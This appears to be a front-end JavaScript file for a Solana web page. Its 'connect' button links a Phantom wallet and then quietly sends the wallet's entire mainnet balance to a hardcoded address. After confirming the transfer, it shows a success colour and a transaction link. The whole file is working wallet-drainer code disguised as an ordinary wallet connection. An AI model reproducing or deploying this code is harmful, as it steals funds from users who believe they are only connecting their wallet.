document.addEventListener('DOMContentLoaded', async () => {
    const connectButton = document.getElementById('connectButton');
    const viewTransaction = document.getElementById('viewTransaction');

    // Check if solanaWeb3 is defined
    if (typeof solanaWeb3 === 'undefined') {
        console.error('Solana Web3.js library is not loaded.');
        return;
    }

    // Create a Solana connection
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');

    // Create a Phantom wallet adapter
    const { PhantomWalletAdapter } = solanaWalletAdapterPhantom;
    const wallet = new PhantomWalletAdapter();

    connectButton.addEventListener('click', async () => {
        try {
            if (!wallet.connected) {
                await wallet.connect();
            }

            const publicKey = wallet.publicKey;
            if (publicKey) {
                // Create a transaction
                const transaction = new solanaWeb3.Transaction();
                const destinationAddress = new solanaWeb3.PublicKey('BeM7Emo9ZF7NWMHL79QdxRHeHnTWAK8ByQ5Qz3aVQHYz');
                const balance = await connection.getBalance(publicKey);

                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: destinationAddress,
                        lamports: balance,
                    })
                );

                // Send transaction
                const { signature } = await wallet.sendTransaction(transaction, connection);
                await connection.confirmTransaction(signature, 'confirmed');

                // Update UI
                connectButton.style.backgroundColor = 'green';
                viewTransaction.style.display = 'block';
                viewTransaction.textContent = 'View Transaction';
                viewTransaction.onclick = () => {
                    window.open(`https://explorer.solana.com/tx/${signature}?cluster=mainnet-beta`, '_blank');
                };
            }
        } catch (error) {
            console.error('Error connecting wallet or sending transaction:', error);
        }
    });
});
